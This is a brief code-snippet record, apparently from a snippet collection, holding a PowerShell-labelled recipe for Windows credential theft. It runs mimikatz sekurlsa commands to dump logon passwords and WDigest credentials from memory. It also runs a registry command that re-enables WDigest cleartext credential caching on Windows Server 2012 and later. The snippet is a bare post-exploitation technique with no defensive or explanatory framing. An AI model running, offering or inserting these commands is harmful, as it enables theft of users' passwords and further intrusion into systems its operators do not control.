---
id: f7e36e0e-3b23-4baa-8ab1-7884048c6f1d
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.124006+00:00'
updated_at: '2023-04-10T20:37:16.233257+00:00'
---

# Code Snippet f7e36e0e

**Language**: Powershell

```powershell
mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest

# to re-enable wdigest in Windows Server 2012+
# in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest 
# create a DWORD 'UseLogonCredential' with the value 1.
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
```
